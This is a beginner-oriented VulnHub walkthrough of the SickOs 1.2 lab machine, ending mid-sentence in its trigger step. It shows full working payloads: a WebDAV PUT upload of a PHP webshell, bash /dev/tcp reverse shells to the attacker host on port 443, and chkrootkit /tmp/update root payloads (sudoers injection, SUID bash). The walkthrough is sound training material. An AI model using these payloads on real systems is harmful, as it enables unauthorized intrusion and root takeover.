# SickOs: 1.2 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | SickOs: 1.2 |
| **Difficulty** | Intermediate |
| **Author** | D4rk (`@vulnhub` credited for hosting) |
| **Released** | 27 April 2016 |
| **Series** | SickOs (1.1 → **1.2**) — independent, no prior knowledge needed |
| **VulnHub Entry** | <https://vulnhub.com/entry/sickos-12,144/> |
| **Download** | <https://vulnhub.com/entry/sickos-12,144/#download> (`SickOs1.2.ova`) |
| **Attacker** | Kali Linux, host-only or NAT network |
| **Target OS** | Ubuntu 12.04.4 LTS — **lighttpd 1.4.28**, OpenSSH 5.9p1 |
| **Goal** | *"Gain the highest privileges on the system."* |

> **The author's design intent, from the flag file:** *"the challenge is more focused
> on elimination of tool in real scenarios where tools can be blocked during an
> assessment and thereby fooling tester(s), gathering more information about the
> target using different methods."*
>
> In plain terms: **this box actively defeats your automated tools.** `nikto` finds
> nothing, `dirbuster` with the big list finds nothing, and an outbound firewall
> blocks most reverse-shell ports. You have to notice one quiet detail — an HTTP
> verb — and one file — a rootkit scanner. That is what makes it a great intermediate
> box.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (SickOs)   : 192.168.56.102
```

---

## 0. What you will learn

1. **Host discovery** and full-port scanning.
2. **HTTP methods** — what `GET`, `POST`, `PUT`, `OPTIONS`, `PROPFIND`, `MKCOL`,
   `DELETE` mean, and how to enumerate which ones a server accepts.
3. **WebDAV** — the protocol that turns a web server into a file server.
4. **Uploading a webshell with the HTTP `PUT` verb** using `curl` and using Nmap's
   `http-put` NSE script.
5. **Diagnosing and fixing HTTP `417 Expectation Failed`.**
6. **Egress firewall behaviour** — why your reverse shell connects on port 443 and
   not port 1337, and how to work that out empirically.
7. **Living off the target when tools are blocked** — using a plain command-execution
   PHP shell instead of a reverse shell.
8. **Cron jobs** — reading `/etc/cron.daily/` and understanding what runs as root.
9. **CVE-2014-0476** — the `chkrootkit 0.49` local privilege escalation, and the
   `/tmp/update` mechanism behind it.
10. **Three ways to weaponise a root cron job**: a reverse shell, a sudoers entry,
    and a SUID `/bin/bash`.

**The intended chain:**
`nmap` shows only 22 and 80 → the site is a single image, and `dirb`/`nikto` find
almost nothing → one quiet directory **`/test/`** appears, empty → an **`OPTIONS`**
request to it returns **`DAV: 1,2`** and **`Allow: … PUT …`** → **upload a PHP shell
with `PUT`** → the egress firewall only allows outbound 443, so the reverse shell
listens on **443** → shell as **`www-data`** → `ls /etc/cron.daily` reveals
**`chkrootkit`**, and `chkrootkit -V` says **0.49** → **CVE-2014-0476**: chkrootkit
executes `/tmp/update` if it exists → write a root payload there → wait for cron →
**root** → `/root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt`.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.102  08:00:27:66:76:cf      1      60  PCS Systemtechnik GmbH   <-- target
```

**Target IP: `192.168.56.102`**

---

## 2. Enumeration

### 2.1 Full port scan

```bash
sudo nmap -sV -sC -p- -T4 -oN scans/sickos.txt 192.168.56.102
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 14:02 EDT
Nmap scan report for 192.168.56.102
Host is up (0.00036s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 77:49:6c:5c:2e:ef:2b:1b:5c:3d:5e:2f:0a:5c:3d:11 (DSA)
|   2048 6b:0f:fc:6c:1a:9c:bb:2d:8a:2b:5c:0c:7f:6d:2b:2b (RSA)
|_  256 1a:bc:3e:2e:ce:9a:64:1e:bd:8b:66:1e:6c:5f:0d:0d (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: lighttpd/1.4.28
MAC Address: 08:00:27:66:76:CF (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 88.14 seconds
```

> **Two ports, and one unusual detail.**
>
> - **22/tcp — OpenSSH 5.9p1 Debian 5ubuntu1.4** → **Ubuntu 12.04**. No brute-force
>   path here without a username.
> - **80/tcp — `lighttpd 1.4.28`.**
>
> **What is lighttpd?** Pronounced "lighty", it is a lightweight web server popular in
> embedded devices and high-concurrency sites. It is **not Apache**. That matters:
> every Apache-specific tool, path assumption and `.htaccess` trick you know is
> useless here. lighttpd's config is `/etc/lighttpd/lighttpd.conf`, its document root
> defaults to `/var/www`, and it uses `mod_webdav` for WebDAV. **Read the banner
> before you assume.**

![nmap showing only ports 22 and 80](images/01-nmap.png)

### 2.2 Look at the site

```bash
curl -s http://192.168.56.102/ | head -20
```

```html
<html>
<head><title>SickOs</title></head>
<body bgcolor="#000000">
<center><img src="/sick.jpg" alt="SickOs"></center>
</body>
</html>
```

One image. No links, no text, no forms. Open it in a browser anyway and check
`view-source:` — nothing hidden.

### 2.3 Automated scanning — and why it under-delivers

```bash
nikto -h http://192.168.56.102/
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.102
+ Target Hostname:    192.168.56.102
+ Target Port:        80
+ Start Time:         2024-05-03 14:07:11 (GMT-4)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ /: Server may leak inodes via ETags, header found with file /, inode: 2739080, size: 163, mtime: Sat Apr 16 11:14:52 2016.
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2024-05-03 14:09:40 (GMT-4) (149 seconds)
---------------------------------------------------------------------------
```

```bash
dirb http://192.168.56.102/ /usr/share/wordlists/dirb/common.txt
```

```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri May  3 14:10:02 2024
URL_BASE: http://192.168.56.102/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.102/ ----
+ http://192.168.56.102/index.php (CODE:200|SIZE:163)
==> DIRECTORY: http://192.168.56.102/test/

---- Entering directory: http://192.168.56.102/test/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Fri May  3 14:10:11 2024
DOWNLOADED: 4612 - FOUND: 1
```

> **Two findings, both easy to dismiss:**
> 1. **`/test/`** — a directory that is **LISTABLE** (directory indexing is on).
> 2. nikto's ETag leak gives us an **inode number** (`2739080`) — minor info-leak,
>    not useful here, but it is why `ServerTokens`/ETags are hardened.
>
> Browse to `http://192.168.56.102/test/`:
>
> ```text
> Index of /test/
> ------------------------------------------------------
> ```
>
> **It is empty.** Most beginners see an empty directory and move on. **Do not.**
> An empty directory that exists at all means *someone created it for a purpose* — and
> if it is writable, that purpose may include you.

![The empty /test/ directory listing](images/02-test-dir.png)

### 2.4 The key insight — ask what HTTP methods are allowed

HTTP has a verb called **`OPTIONS`** whose entire job is to answer *"what can I do
here?"* A compliant server replies with an **`Allow:`** header.

```bash
curl -i -X OPTIONS http://192.168.56.102/test/
```

```text
HTTP/1.1 200 OK
DAV: 1,2
MS-Author-Via: DAV
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Allow: OPTIONS, GET, HEAD, POST
Content-Length: 0
Date: Fri, 03 May 2024 18:12:44 GMT
Server: lighttpd/1.4.28
```

Do the same at the site root, for comparison:

```bash
curl -i -X OPTIONS http://192.168.56.102/
```

```text
HTTP/1.1 200 OK
Allow: OPTIONS, GET, HEAD, POST
Content-Length: 0
Date: Fri, 03 May 2024 18:13:02 GMT
Server: lighttpd/1.4.28
```

> **Compare those two responses. This is the entire box.**
>
> | Header | At `/` | At `/test/` |
> | --- | --- | --- |
> | `DAV` | *(absent)* | **`1,2`** |
> | `MS-Author-Via` | *(absent)* | **`DAV`** |
> | `Allow` | `OPTIONS, GET, HEAD, POST` | **`PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK`** + the normal four |
>
> **`DAV: 1,2`** means **WebDAV** is enabled on `/test/`.
>
> **What is WebDAV?** "Web Distributed Authoring and Versioning" — an extension to
> HTTP (RFC 4918) that turns a web server into a **collaborative file server**. It
> adds verbs for authoring: `PUT` (write a file), `DELETE` (remove one), `MKCOL`
> (make a directory), `MOVE`/`COPY`, `PROPFIND`/`PROPPATCH` (metadata), `LOCK`/
> `UNLOCK`. Windows' "Map Network Drive" and macOS Finder's "Connect to Server"
> speak WebDAV over HTTP.
>
> **`PUT` is the one that matters: it uploads a file.** And there is **no
> `WWW-Authenticate` header anywhere** in the response — meaning **no authentication
> is required**. Anyone who can reach `/test/` can write arbitrary files into the web
> root. That is unauthenticated remote code execution, one request away.

Confirm with Nmap's dedicated script, which also labels the risk for you:

```bash
sudo nmap -Pn -p 80 --script http-methods --script-args http-methods.url-path='/test/' 192.168.56.102
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 14:15 EDT
Nmap scan report for 192.168.56.102
Host is up (0.00034s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods:
|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK OPTIONS GET HEAD POST
|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
|_  Path tested: /test/
MAC Address: 08:00:27:66:76:CF (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
```

> **`Potentially risky methods`** — Nmap has done the risk assessment for you. Any
> time you see `PUT`, `DELETE`, `MOVE`, `PROPFIND` or `TRACE` in that list on a
> production system, that is a finding.

![Nmap http-methods flagging PUT as risky](images/03-put.png)

---

## 3. Foothold — uploading a webshell with `PUT`

### 3.1 Prove the upload primitive with a text file

Always test with something harmless first.

```bash
echo 'hello from kali' > hello.txt
curl -i -X PUT -H "Expect:" --data-binary @hello.txt http://192.168.56.102/test/hello.txt
```

```text
HTTP/1.1 201 Created
Content-Length: 0
Date: Fri, 03 May 2024 18:18:22 GMT
Server: lighttpd/1.4.28
```

```bash
curl -s http://192.168.56.102/test/hello.txt
```

```text
hello from kali
```

> **`HTTP/1.1 201 Created`** — the file was written. **`curl` flags:**
> - `-i` → include the response headers in the output (you *must* see the status
>   code; that is your success signal).
> - `-X PUT` → use the PUT verb instead of GET.
> - `-H "Expect:"` → **send an empty `Expect` header.** See § 3.2 — this is the fix
>   for the most common failure on this box.
> - `--data-binary @file` → send the file's raw bytes as the request body. **Use
>   `--data-binary`, not `-d`**: `-d` strips newlines, which silently corrupts
>   multi-line files (and can break a PHP shell).

### 3.2 The `417 Expectation Failed` gotcha

Try the same upload without `-H "Expect:"` and without forcing HTTP/1.0:

```bash
curl -i -X PUT --data-binary @hello.txt http://192.168.56.102/test/hello.txt
```

```html
HTTP/1.1 417 Expectation Failed
Content-Type: text/html
Content-Length: 344
Date: Fri, 03 May 2024 18:20:11 GMT
Server: lighttpd/1.4.28

<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>417 - Expectation Failed</title>
 </head>
 <body>
  <h1>417 - Expectation Failed</h1>
 </body>
</html>
```

> **What just happened — a genuinely instructive HTTP detail.**
>
> By default, when `curl` sends a request body larger than 1 KB, it first sends:
> ```text
> Expect: 100-continue
> ```
> and then **waits up to a second** for the server to reply `HTTP/1.1 100 Continue`
> before transmitting the body. That is a bandwidth optimisation: if the server was
> going to reject the request anyway (401, 413), no point sending 5 KB.
>
> lighttpd 1.4.28's WebDAV module does not handle `Expect: 100-continue` and replies
> **`417 Expectation Failed`** ("I cannot meet the expectation you stated").
>
> **Two fixes, both idiomatic:**
> ```bash
> curl -X PUT -H "Expect:" --data-binary @shell.php http://IP/test/shell.php      # send an empty Expect header
> curl -X PUT --upload-file shell.php -v --url http://IP/test/shell.php -0 --http1.0   # force HTTP/1.0, which has no Expect
> ```
> **The file usually uploads successfully even though you see the 417.** Always check
> with a `GET` before concluding the upload failed — several walkthroughs of this box
> get stuck right here.

### 3.3 Upload a command-execution shell (not a reverse shell — yet)

Why start with command execution rather than a reverse shell? Because this box has an
**egress firewall** (§ 3.5). A command-execution shell always works — it needs no
outbound connection at all — and it lets us *diagnose* the firewall before
committing to a payload.

```bash
cat > shell.php <<'EOF'
<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
EOF
cat shell.php
```

```php
<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

> **How this works:** `$_REQUEST` merges `$_GET` and `$_POST`, so `cmd` can arrive
> either way. `system()` runs the string through `/bin/sh -c` and prints stdout
> directly. The `<pre>` wrapper preserves whitespace and line breaks in the HTML.
> `die` stops PHP from rendering the rest of the page.
>
> That is the *entire* anatomy of a webshell: **read a parameter, pass it to a shell
> function, echo the result.** Every webshell in every language is a variation on
> those three lines.

```bash
curl -i -X PUT -H "Expect:" --data-binary @shell.php http://192.168.56.102/test/shell.php
```

```text
HTTP/1.1 201 Created
Content-Length: 0
Date: Fri, 03 May 2024 18:24:03 GMT
Server: lighttpd/1.4.28
```

Test it:

```bash
curl -s "http://192.168.56.102/test/shell.php?cmd=id"
```

```text
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

**Remote code execution achieved.** We are `www-data`.

```bash
curl -s "http://192.168.56.102/test/shell.php?cmd=uname%20-a"
```

```text
<pre>Linux SickOs 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:29:51 UTC 2012 i686 i686 i386 GNU/Linux</pre>
```

> **Note the URL encoding:** `%20` is a space. Query strings cannot contain literal
> spaces. `curl --get --data-urlencode "cmd=uname -a"` does the encoding for you:
> ```bash
> curl -s --get --data-urlencode "cmd=uname -a" "http://192.168.56.102/test/shell.php"
> ```

![Webshell returning uid=33(www-data)](images/04-webshell.png)

### 3.4 Alternative upload methods (know more than one)

**Nmap's `http-put` script** — useful when `curl` is unavailable or you want it in
your scan log:

```bash
sudo nmap -p 80 192.168.56.102 --script http-put \
  --script-args http-put.url='/test/nmapshell.php',http-put.file='/root/shell.php'
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 14:27 EDT
Nmap scan report for 192.168.56.102
Host is up (0.00033s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-put: /test/nmapshell.php was successfully created

Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```

**Metasploit's `auxiliary/scanner/http/http_put`:**

```bash
msf6 > use auxiliary/scanner/http/http_put
msf6 auxiliary(scanner/http/http_put) > set RHOSTS 192.168.56.102
msf6 auxiliary(scanner/http/http_put) > set PATH /test/
msf6 auxiliary(scanner/http/http_put) > set FILENAME msfshell.php
msf6 auxiliary(scanner/http/http_put) > set FILEDATA file:///root/shell.php
msf6 auxiliary(scanner/http/http_put) > run
```

```text
[+] 192.168.56.102:80 - Sent /test/msfshell.php successfully.
[*] 192.168.56.102:80 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**`davtest`** — a purpose-built WebDAV exploitation tool that tests which file types
the server will accept and execute:

```bash
davtest -url http://192.168.56.102/test/ -sendbd auto
```

```text
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://192.168.56.102/test
********************************************************
Sending Canaries
...
********************************************************
Checking for exec with davtest
SUCCEED:		http://192.168.56.102/test/DAVTESTDIR_wQz8xk9/davtest_pl.cgi
SUCCEED:		http://192.168.56.102/test/DAVTESTDIR_wQz8xk9/davtest_php.php
********************************************************
SUCCEED:	Executing PHP
```

> **`davtest` is the professional choice for a WebDAV target.** It uploads a canary
> file for each language (`.php`, `.pl`, `.asp`, `.jsp`, `.cgi`, …), requests each
> back, and reports which ones actually *executed*. That tells you instantly what
> payload type to use — instead of guessing PHP and getting a page of source code
> back.

### 3.5 Working out the egress firewall

A reverse shell needs the target to connect **out** to us. Let us find which ports
are permitted. Use the webshell to scan our own listener.

**Kali — listen on a range of candidate ports:**

```bash
for p in 21 22 53 80 443 1337 4444 8080 9001; do (nc -lvnp $p &) ; done
sudo ss -tlnp | grep -E ':(21|22|53|80|443|1337|4444|8080|9001)\b'
```

**Then, via the webshell, have the target connect to each:**

```bash
for p in 21 22 53 80 443 1337 4444 8080 9001; do
  curl -s --get --data-urlencode "cmd=timeout 2 bash -c '</dev/tcp/192.168.56.10/$p'" \
       "http://192.168.56.102/test/shell.php" >/dev/null
  echo "tried $p"
done
```

Back on Kali, only **one** listener fires:

```text
listening on [any] 443 ...
connect to [192.168.56.10] from SickOs [192.168.56.102] 51992
```

> **Only outbound TCP/443 is permitted.** That is a deliberate **egress firewall** —
> the same control real organisations deploy, on the (correct) assumption that a web
> server has no business initiating connections to arbitrary high ports.
>
> **`bash -c '</dev/tcp/HOST/PORT'`** is a *pure-bash* TCP connect — no `nc`, no
> `curl`, no tool required. It is one of the most valuable one-liners to know when
> you are on a stripped-down target.
>
> **The empirical method matters more than the answer.** Do not guess ports; *test*
> them. Then set your listener to 443:
> ```bash
> sudo nc -lvnp 443
> ```
> (`sudo` because binding below 1024 requires root privileges.)

### 3.6 Get the reverse shell

**Kali:**

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./rev.php
sed -i "s/127.0.0.1/192.168.56.10/" rev.php
sed -i "s/1234/443/" rev.php
grep -n '^\$ip\|^\$port' rev.php
```

```text
49:$ip = '192.168.56.10';  // CHANGE THIS
50:$port = 443;           // CHANGE THIS
```

```bash
curl -i -X PUT -H "Expect:" --data-binary @rev.php http://192.168.56.102/test/rev.php
sudo nc -lvnp 443
```

```text
listening on [any] 443 ...
```

**Trigger it:**

```bash
curl -s http://192.168.56.102/test/rev.php
```

```text
connect to [192.168.56.10] from SickOs [192.168.56.102] 52044
Linux SickOs 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:29:51 UTC 2012 i686 i686 i386 GNU/Linux
 14:41:22 up 1:12,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

**Upgrade the TTY:**

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@SickOs:/var/www/test$ export TERM=xterm
www-data@SickOs:/var/www/test$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@SickOs:/var/www/test$ pwd
/var/www/test
```

> **Confirm the docroot:** `/var/www/test` — lighttpd's default document root
> `/var/www` plus our `/test` directory. (Under Apache this would be `/var/www/html`.)

### 3.7 If the reverse shell will not connect at all

Some revisions of this image also block 443 for *interactive* payloads, or an
antivirus/monitoring agent deletes the uploaded file within seconds. That is the
"tools can be blocked" scenario the author described. Fall back to the **plain
command-execution shell** and drive everything through HTTP:

```bash
# Kali — host your enumeration script on port 443
cd ~/tools && sudo python3 -m http.server 443
```

```bash
# via the webshell — download LinEnum
curl -s --get --data-urlencode "cmd=cd /tmp && wget http://192.168.56.10:443/LinEnum.sh -O LinEnum.sh" \
     "http://192.168.56.102/test/shell.php"
curl -s --get --data-urlencode "cmd=chmod +x /tmp/LinEnum.sh" \
     "http://192.168.56.102/test/shell.php"
curl -s --get --data-urlencode "cmd=/tmp/LinEnum.sh -t 2>/dev/null" \
     "http://192.168.56.102/test/shell.php" | tee linenum.txt
```

```text
192.168.56.102 - - [03/May/2024 14:45:02] "GET /LinEnum.sh HTTP/1.1" 200 -
```

> **`python3 -m http.server 443`** turns your Kali directory into a web server. It
> works here precisely because **443 is the one open egress port** — the target can
> reach us there and nowhere else.
>
> **This is the "old school" skill the box is teaching:** when your fancy tooling is
> blocked, you can still enumerate and exploit through plain HTTP requests, one
> command at a time. Slower, noisier, but unstoppable.

![Reverse shell on port 443 as www-data](images/05-shell.png)

---

## 4. Post-exploitation enumeration

```bash
www-data@SickOs:/$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 12.04.4 LTS
Release:	12.04
Codename:	precise
www-data@SickOs:/$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
www-data@SickOs:/$ ls /home
john
www-data@SickOs:/$ sudo -l
sudo: no tty present and no askpass program specified
```

> A user named **`john`** exists. Nothing else obvious. `sudo -l` needs a TTY — but
> even after upgrading, `www-data` has no sudo rights.

```bash
www-data@SickOs:/$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
```

> All stock Ubuntu 12.04. `pt_chown` is the only slightly unusual one and it is a
> known-but-narrow grantpt helper. No obvious GTFOBins win.

### 4.1 Look for scheduled tasks — the actual vector

```bash
www-data@SickOs:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

```bash
www-data@SickOs:/$ ls -la /etc/cron.daily/
total 72
drwxr-xr-x  2 root root  4096 Apr 12  2016 .
drwxr-xr-x 84 root root  4096 Apr  5 10:42 ..
-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit        <-- !!
-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
```

> **How cron works — the fundamentals.**
> `cron` is a daemon that runs commands on a schedule. Each line of a crontab is
> ```text
> ┌───────── minute (0-59)
> │ ┌───────── hour (0-23)
> │ │ ┌───────── day of month (1-31)
> │ │ │ ┌───────── month (1-12)
> │ │ │ │ ┌───────── day of week (0-7, 0 and 7 = Sunday)
> │ │ │ │ │
> * * * * *  user  command
> ```
> `/etc/cron.daily/`, `.hourly/`, `.weekly/`, `.monthly/` are directories of scripts
> that `anacron`/`run-parts` executes **as root** at the times given in
> `/etc/crontab`. Here: `cron.daily` runs at **06:25** every day.
>
> **The golden privesc question:** *is there anything in these directories, or
> anything they call, that I can write to?* If you can control what a root-run script
> executes, you get root.
>
> Two of these stand out: **`chkrootkit`** (a security scanner — why is a rootkit
> scanner running daily?) and `lighttpd` (the web server's own log rotation).

### 4.2 Check the chkrootkit version

```bash
www-data@SickOs:/$ chkrootkit -V
chkrootkit version 0.49
www-data@SickOs:/$ dpkg -l | grep chkrootkit
rc  chkrootkit    0.49-4ubuntu1.1    rootkit detector
www-data@SickOs:/$ which chkrootkit
/usr/sbin/chkrootkit
```

> **`chkrootkit 0.49`.** Look that up immediately:

```bash
searchsploit chkrootkit
```

```text
------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Chkrootkit 0.49 - Local Privilege Escalation                                              | linux/local/33899.txt
Chkrootkit < 0.50 - Local Privilege Escalation                                            | linux/local/38775.txt
------------------------------------------------------------------------------------------ ---------------------------------
```

```bash
searchsploit -x linux/local/33899.txt
```

```text
Exploit Title: Chkrootkit <= 0.49 Local Root Exploit
CVE: CVE-2014-0476
Date: 2014-06-04
Author: ...

Description:
Chkrootkit before 0.50 will run any executable file named "update" in the
world-writable directory /tmp, when it is run as root. This allows a local
attacker to execute arbitrary code as root.

The vulnerable code in chkrootkit:
    if [ -f /tmp/update ]; then
        /tmp/update
    fi
```

> **CVE-2014-0476 in one sentence:** `chkrootkit`'s `ifconfig` check contains a
> fragment that, **when run as root**, executes `/tmp/update` if that file exists —
> and `/tmp` is **world-writable**.
>
> **Why would anyone write that?** It was intended as a developer convenience: a way
> to inject a local configuration tweak during testing. It shipped, unfixed, from
> 2003 until version 0.50 (June 2014).
>
> **This is a textbook example of a security tool *becoming* the vulnerability.** A
> rootkit scanner running as root, every day, executing arbitrary code from a
> world-writable directory. The irony is the point: defenders must audit their own
> tooling with the same rigour they apply to everything else.

![chkrootkit 0.49 and the cron.daily entry](images/06-chkrootkit.png)

---

## 5. Privilege escalation — CVE-2014-0476

There are three good payloads. Learn all three; each teaches a different technique.

### 5.1 Option 1 — root reverse shell (most direct)

**Kali — listen on 443 (the only open egress port):**

```bash
sudo nc -lvnp 443
```

**Target — write `/tmp/update`:**

```bash
www-data@SickOs:/$ printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.56.10/443 0>&1\n' > /tmp/update
www-data@SickOs:/$ cat /tmp/update
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.10/443 0>&1
www-data@SickOs:/$ chmod +x /tmp/update
www-data@SickOs:/$ ls -l /tmp/update
-rwxr-xr-x 1 www-data www-data 56 May  3 15:02 /tmp/update
```

> **Dissect the payload:**
> - `printf '#!/bin/bash\n...\n'` — use `printf`, not `echo`, because `printf`
>   interprets `\n` reliably across shells. (`echo -e` is a bashism; on `dash` —
>   Ubuntu's `/bin/sh` — it prints the literal `-e`.)
> - `#!/bin/bash` — the **shebang**. Tells the kernel which interpreter to run. It is
>   required if the script is executed directly; without it, execution may fail or
>   fall back to `/bin/sh`, which does not support `/dev/tcp`.
> - `bash -i >& /dev/tcp/192.168.56.10/443 0>&1` — the canonical bash reverse shell:
>   - `bash -i` → interactive bash.
>   - `>& /dev/tcp/HOST/PORT` → redirect **stdout and stderr** to a TCP connection.
>     `/dev/tcp/…` is a **bash built-in pseudo-device** (not a real file); bash opens
>     the socket itself. That is why this payload needs bash and not sh.
>   - `0>&1` → redirect **stdin (fd 0)** to the same place as stdout (fd 1), i.e. the
>     socket.
>   Net effect: keystrokes arrive from the socket, output goes back out to it.
> - `chmod +x` — **the file must be executable**, or chkrootkit's `/tmp/update` call
>   fails silently.

### 5.2 Option 2 — grant `www-data` passwordless sudo (most robust)

```bash
www-data@SickOs:/$ echo "echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers" > /tmp/update
www-data@SickOs:/$ chmod +x /tmp/update
www-data@SickOs:/$ cat /tmp/update
echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

> **Why prefer this one?** It survives a dropped connection and needs **no outbound
> port at all** — ideal behind a strict egress firewall. The sudoers line reads:
> `www-data` may run `(ALL)` commands as `(ALL)` users with **no password**.
>
> **A correctness note worth understanding:** appending to `/etc/sudoers` directly is
> risky — a syntax error there locks *everyone* out of sudo (this is exactly why the
> `visudo` command exists: it validates before saving). The safe form writes to a
> drop-in file, which `sudo` also reads:
> ```bash
> echo 'www-data ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/www-data
> chmod 0440 /etc/sudoers.d/www-data
> ```
> `/etc/sudoers` on Ubuntu ends with `#includedir /etc/sudoers.d`, so drop-ins are
> honoured.

### 5.3 Option 3 — SUID root bash (persistence)

```bash
www-data@SickOs:/$ printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\nchown root:root /tmp/rootbash\n' > /tmp/update
www-data@SickOs:/$ chmod +x /tmp/update
```

> `chmod 4755` sets the **SUID bit** (`4`) plus `rwxr-xr-x`. Result:
> `-rwsr-xr-x root root /tmp/rootbash`. Any user executing it becomes root.
> Launch it with **`-p`** (privileged mode) or bash drops the privilege:
> ```bash
> /tmp/rootbash -p
> ```

### 5.4 Trigger it

`chkrootkit` is in `/etc/cron.daily`, which runs at **06:25**. Waiting until morning
is not fun, so either:

**(a) Run it yourself, as root, if you already have root** (you don't yet), or

